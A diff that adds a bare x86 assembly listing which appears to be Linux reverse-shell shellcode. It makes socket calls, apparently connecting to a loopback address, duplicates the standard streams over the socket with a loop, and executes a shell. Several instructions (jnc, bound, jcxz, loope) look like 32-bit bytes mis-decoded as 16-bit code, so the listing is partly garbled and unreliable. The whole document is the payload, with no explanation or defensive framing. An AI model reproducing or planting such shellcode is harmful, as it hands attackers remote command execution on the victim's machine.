@@ -1,0 +1,36 @@
+xor bx,bx
+mul bx
+push bx
+inc bx
+push bx
+push byte +0x2
+mov cx,sp
+mov al,0x66
+int 0x80
+xchg ax,bx
+pop cx
+mov al,0x3f
+int 0x80
+dec cx
+jns 0x11
+push word 0x17f
+add [bx+di],ax
+push word 0x2
+adc [si-0x77],bx
+loope 0xffd5
+push eax
+push cx
+push bx
+mov bl,0x3
+mov cx,sp
+int 0x80
+push dx
+push word 0x2f6e
+jnc 0x9d
+push word 0x2f2f
+bound bp,[bx+di-0x77]
+jcxz 0x8f
+push bx
+mov cx,sp
+mov al,0xb
+int 0x80
